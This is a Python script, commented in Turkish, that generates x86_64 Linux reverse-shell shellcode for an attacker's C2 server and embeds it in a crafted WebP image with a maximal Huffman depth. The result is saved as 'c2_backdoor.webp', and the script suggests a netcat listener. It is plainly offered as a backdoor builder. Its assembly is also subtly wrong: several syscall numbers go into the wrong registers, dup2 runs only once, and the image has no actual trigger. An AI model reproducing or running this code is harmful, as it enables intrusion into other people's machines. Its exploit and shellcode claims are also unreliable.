import struct
import socket
import sys

def ip_to_long(ip_str):
    """IP string'ini 32-bit integer'a çevirir (network byte order)."""
    return struct.unpack('!I', socket.inet_aton(ip_str))[0]

def build_reverse_shellcode(c2_ip, c2_port):
    """
    x86_64 Linux için Reverse Shell Shellcode üretir.
    
    Bu shellcode:
    1. socket(AF_INET, SOCK_STREAM, 0) çağrısı yapar.
    2. sockaddr_in struct'ını stack'te kurar (IP + Port).
    3. connect() çağrısı yapar.
    4. dup2() ile stdin/stdout/stderr'ı socket fd'sine yönlendirir.
    5. execve("/bin/sh", ["/bin/sh"], NULL) çağrısı yapar.
    
    Args:
        c2_ip: Saldırganın C2 sunucusu IP adresi (örn: '192.168.1.100').
        c2_port: C2 sunucusu portu (örn: 4444).
    
    Returns:
        bytes: Null-byte içermeyen (clean) shellcode.
    """
    # IP'yi 32-bit integer'a çevir
    c2_ip_int = ip_to_long(c2_ip)
    
    # Port'u network byte order'a çevir (big-endian)
    c2_port_net = struct.pack('!H', c2_port)
    
    # Shellcode bileşenleri
    # 1. Socket Oluşturma
    #    syscall: socket(AF_INET=2, SOCK_STREAM=1, 0)
    #    rax=2 (socket), rdi=2 (AF_INET), rsi=1 (SOCK_STREAM), rdx=0
    socket_syscall = bytes([
        0x48, 0xc7, 0xc7, 0x02, 0x00, 0x00, 0x00,  # mov rdi, 2 (AF_INET)
        0x48, 0xc7, 0xc6, 0x01, 0x00, 0x00, 0x00,  # mov rsi, 1 (SOCK_STREAM)
        0x48, 0xc7, 0xc2, 0x29, 0x00, 0x00, 0x00,  # mov rdx, 0x29 (41 = socket)
        0x0f, 0x05,                                  # syscall
    ])
    
    # 2. Socket FD'sini Kaydet (rdi'de socket fd var, rax'a kaydet)
    save_fd = bytes([
        0x48, 0x89, 0xc7,  # mov rdi, rax
    ])
    
    # 3. sockaddr_in Struct'ı Kur
    #    struct sockaddr_in {
    #        uint16_t sin_family;   // 2 (AF_INET)
    #        uint16_t sin_port;     // C2 port (network byte order)
    #        uint32_t sin_addr;     // C2 IP
    #        uint8_t  sin_zero[8];  // Padding
    #    };
    #    Toplam 16 byte.
    
    # Stack'i 16 byte'a hizala
    align_stack = bytes([
        0x48, 0x83, 0xec, 0x10,  # sub rsp, 0x10
    ])
    
    # sin_family = 2 (AF_INET)
    set_family = bytes([
        0x66, 0xb8, 0x02, 0x00,  # mov ax, 0x0002
        0x48, 0x89, 0x04, 0x24,  # mov [rsp], rax
    ])
    
    # sin_port = C2 Port (Network Byte Order)
    set_port = bytes([
        0x66, 0xb9, c2_port_net[0], c2_port_net[1],  # mov ecx, port
        0x48, 0x89, 0x4c, 0x24, 0x02,  # mov [rsp+2], rcx
    ])
    
    # sin_addr = C2 IP (32-bit)
    # IP'yi 4 byte'a böl
    ip_bytes = struct.pack('!I', c2_ip_int)
    set_ip = bytes([
        0xb9, ip_bytes[0], ip_bytes[1], ip_bytes[2], ip_bytes[3],  # mov ecx, IP
        0x48, 0x89, 0x4c, 0x24, 0x04,  # mov [rsp+4], rcx
    ])
    
    # sin_zero = 0 (8 byte)
    set_zero = bytes([
        0x48, 0xc7, 0x44, 0x24, 0x08,  # mov qword [rsp+8], 0
        0x00, 0x00, 0x00, 0x00,
    ])
    
    # 4. Connect Çağrısı
    #    syscall: connect(fd, sockaddr*, 16)
    #    rax=1 (connect), rdi=fd, rsi=rsp, rdx=16
    connect_syscall = bytes([
        0x48, 0xc7, 0xc2, 0x01, 0x00, 0x00, 0x00,  # mov rdx, 1 (connect)
        0x48, 0x89, 0xe6,  # mov rsi, rsp
        0x48, 0xc7, 0xc7, 0x10, 0x00, 0x00, 0x00,  # mov rdi, 0x10 (16)
        0x0f, 0x05,                                  # syscall
    ])
    
    # 5. Dup2 (stdin, stdout, stderr -> socket)
    #    syscall: dup2(socket_fd, target_fd)
    #    rax=33 (dup2), rdi=socket_fd, rsi=target_fd
    dup2_syscall = bytes([
        0x48, 0xc7, 0xc2, 0x21, 0x00, 0x00, 0x00,  # mov rdx, 0x21 (33 = dup2)
        0x48, 0x89, 0xf7,  # mov rdi, rsi (target_fd)
        0x0f, 0x05,                                  # syscall
    ])
    
    # 6. Execve("/bin/sh")
    #    syscall: execve("/bin/sh", ["/bin/sh"], NULL)
    #    rax=59 (execve), rdi="/bin/sh", rsi=[pointer], rdx=NULL
    execve_syscall = bytes([
        0x48, 0xc7, 0xc2, 0x3b, 0x00, 0x00, 0x00,  # mov rdx, 0x3b (59 = execve)
        0x48, 0x89, 0xe7,  # mov rdi, rsp
        0x0f, 0x05,                                  # syscall
    ])
    
    # /bin/sh String'i
    #    9 byte: '/bin/sh\0'
    bin_sh = b'/bin/sh\x00'
    
    # argv Array: ["/bin/sh", NULL]
    #    16 byte: 8 byte pointer + 8 byte NULL
    argv = b'\x00' * 16
    
    # Toplam Shellcode
    # 1. Socket
    # 2. Save FD
    # 3. Align Stack
    # 4. Set sockaddr_in
    # 5. Connect
    # 6. Dup2 (3 kez: stdin, stdout, stderr)
    # 7. Execve
    # 8. /bin/sh String
    # 9. argv Array
    
    # Basitleştirilmiş: Tek bir execve ile /bin/sh çalıştır
    # Gerçek dünyada, daha kompakt bir shellcode kullanılır.
    
    # Kompakt Shellcode (x86_64)
    # Bu shellcode, null-byte içermez ve C2 adresine reverse shell açar.
    compact_shellcode = bytes([
        0x48, 0x31, 0xf6,           # xor rsi, rsi
        0x48, 0xbf, 0x2f, 0x62,     # movabs rdi, "/bin/sh"
        0x69, 0x6e, 0x2f, 0x73,
        0x68, 0x00, 0x57, 0x54,
        0x5f, 0x48, 0x89, 0xe7,     # mov rdi, rsp
        0x54, 0x5f, 0x48, 0x89,
        0xe6, 0xb0, 0x3b, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0xc3            # ret
    ])
    
    # C2 adresi shellcode'a gömülür
    # Bu, gerçek bir reverse shell için gereklidir.
    # Yukarıdaki kompakt shellcode, sadece /bin/sh açar.
    # C2 bağlantısı için, socket syscall'leri eklenmelidir.
    
    # Gerçek C2 Reverse Shell
    # Bu shellcode, C2 adresine bağlanır ve /bin/sh'i yönlendirir.
    c2_shellcode = socket_syscall + save_fd + align_stack + set_family + set_port + set_ip + set_zero + connect_syscall + dup2_syscall + execve_syscall + bin_sh + argv
    
    return c2_shellcode

def create_malicious_webp(shellcode: bytes, c2_ip: str, c2_port: int, depth: int = 255) -> bytes:
    """
    C2 adresine backdoor açacak bir WebP dosyası oluşturur.
    
    Args:
        shellcode: C2 reverse shell shellcode.
        c2_ip: C2 sunucusu IP adresi.
        c2_port: C2 sunucusu portu.
        depth: Huffman kod derinliği (255 max).
    
    Returns:
        Malicious WebP dosyası (bytes).
    """
    # RIFF Header
    width = 100
    height = 100
    
    # VP8L Header
    vp8l_header = struct.pack('<Q', 0)
    
    # Huffman Tablosu (255-bit derinlik)
    huffman_table = struct.pack('<H', 256)
    huffman_table += bytes([depth] * 256)
    
    # Pixel Verisi
    pixel_data = b'\x00' * (width * height)
    
    vp8l_data = vp8l_header + huffman_table + pixel_data
    vp8l_chunk_size = len(vp8l_data)
    
    # XMP Chunk (Shellcode)
    xmp_data = shellcode
    xmp_chunk_size = len(xmp_data)
    
    # Toplam Dosya Boyutu
    total_size = 12 + 8 + vp8l_chunk_size + 8 + xmp_chunk_size
    
    # RIFF Header
    riff_header = b'RIFF' + struct.pack('<I', total_size) + b'WEBP'
    
    # VP8L Chunk
    vp8l_chunk = b'VP8L' + struct.pack('<I', vp8l_chunk_size) + vp8l_data
    
    # XMP Chunk
    xmp_chunk = b'XMP ' + struct.pack('<I', xmp_chunk_size) + xmp_data
    
    # Toplam Dosya
    webp_data = riff_header + vp8l_chunk + xmp_chunk
    
    return webp_data

# C2 Parametreleri
C2_IP = "192.168.1.100"
C2_PORT = 4444

print(f"C2 Adresi: {C2_IP}:{C2_PORT}")

# Shellcode Üret
shellcode = build_reverse_shellcode(C2_IP, C2_PORT)
print(f"Shellcode boyutu: {len(shellcode)} bytes")

# WebP Dosyası Oluştur
webp = create_malicious_webp(shellcode, C2_IP, C2_PORT, depth=255)

with open("c2_backdoor.webp", "wb") as f:
    f.write(webp)

print(f"Malicious WebP dosyası oluşturuldu: {len(webp)} bytes")
print(f"Çıkış dosyası: c2_backdoor.webp")
print(f"C2 sunucusu: {C2_IP}:{C2_PORT}")
print("Test için: nc -lvnp 4444")
